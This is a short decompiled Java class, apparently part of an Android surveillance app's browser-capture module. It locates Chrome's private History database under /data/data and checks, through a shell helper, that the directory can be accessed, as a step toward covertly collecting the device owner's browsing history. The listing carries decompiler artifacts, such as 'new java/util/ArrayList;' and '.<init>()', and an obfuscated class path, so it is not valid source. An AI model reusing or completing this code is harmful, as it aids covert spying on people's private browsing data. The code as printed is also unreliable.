package com.vvt.capture.chrome.b;

import com.vvt.io.p;
import com.vvt.shell.ShellUtil;
import java.util.ArrayList;
import java.util.List;

public class a
{
  public static List a()
  {
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    String str = p.a("/data/data/com.android.chrome/app_chrome/Default", "History");
    localArrayList.add(str);
    return localArrayList;
  }
  
  public static String b()
  {
    String str1 = null;
    String str2 = "/data/data/com.android.chrome/app_chrome/Default";
    boolean bool = ShellUtil.b(str2);
    if (bool) {
      str1 = "/data/data/com.android.chrome/app_chrome/Default";
    }
    return str1;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/chrome/removeFromPath/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */